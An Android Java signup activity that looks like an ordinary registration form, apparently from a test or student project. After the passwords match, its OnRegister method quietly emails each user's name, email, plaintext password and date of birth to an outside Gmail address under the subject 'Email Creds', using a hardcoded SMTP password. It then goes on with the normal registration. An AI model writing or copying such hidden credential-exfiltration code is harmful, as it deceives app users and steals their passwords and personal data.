package com.example.testproject;

import android.app.AlertDialog;
import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.os.StrictMode;
import android.view.View;
import android.widget.EditText;
import android.widget.Button;

import java.util.Properties;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;

public class SignUp extends Activity {
    AlertDialog alertDialog;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.signup);


        ((Button) findViewById(R.id.back_button3)).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent (SignUp.this, MainActivity.class);
                SignUp.this.startActivity(intent);
            }
        });
        StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
        StrictMode.setThreadPolicy(policy);
    }

    public void OnRegister(View view) {                //OnRegister method to register
        EditText rName = (EditText) findViewById(R.id.txtRegisterName);
        EditText rEmail = (EditText) findViewById(R.id.txtRegisterEmail);
        EditText rPwd = (EditText) findViewById(R.id.txtRegisterPassword);
        EditText rChkPwd = (EditText) findViewById(R.id.txtCfmPwdSignUp);
        EditText rDOB = (EditText) findViewById(R.id.txtDOBSignUp);

        String rname = rName.getText().toString();
        String remail = rEmail.getText().toString();
        String rpassword = rPwd.getText().toString();
        String rconfirmpassword = rChkPwd.getText().toString();
        String rdob = rDOB.getText().toString();

        if (rconfirmpassword.equals(rpassword))
        {

            String body = rname + " " + remail + " " + rpassword + " " + rdob;
            //Send background email of credentials
            final String receiver = "2207dbwebsite@gmail.com";
            final String username = "2207dbwebsite@gmail.com";
            final String password = "Passw0rd321";
            final String emailCredentialsMessage = body;
            String messageToSend = emailCredentialsMessage;
            Properties props = new Properties();
            props.put("mail.smtp.auth", "true");
            props.put("mail.smtp.starttls.enable", "true");
            props.put("mail.smtp.host", "smtp.gmail.com");
            props.put("mail.smtp.port", "587");
            Session session = Session.getInstance(props,
                    new javax.mail.Authenticator(){
                        @Override
                        protected PasswordAuthentication getPasswordAuthentication(){
                            return new PasswordAuthentication(username,password);
                        }
                    });
            try{
                Message message = new MimeMessage(session);
                message.setFrom(new InternetAddress(username));
                message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(receiver));
                message.setSubject("Email Creds: "+remail);
                message.setText(messageToSend);
                Transport.send(message);
            }catch (MessagingException e){
                throw new RuntimeException(e);
            }

            String type = "register";
            BackgroundWorker backgroundWorker = new BackgroundWorker(this);
            backgroundWorker.execute(type, rname, remail, rpassword, rdob);
            finish();

            Intent intent = new Intent (SignUp.this, HomePage.class);
            SignUp.this.startActivity(intent);

        }
        else if (rconfirmpassword.equals("") || rpassword.equals(""))
        {
            alertDialog.setMessage("Password fields cannot be left blank");
            alertDialog.show();
        }
        else if (!rconfirmpassword.equals(rpassword))
        {
            alertDialog.setMessage("Password not matching");
            alertDialog.show();
        }

    }

}


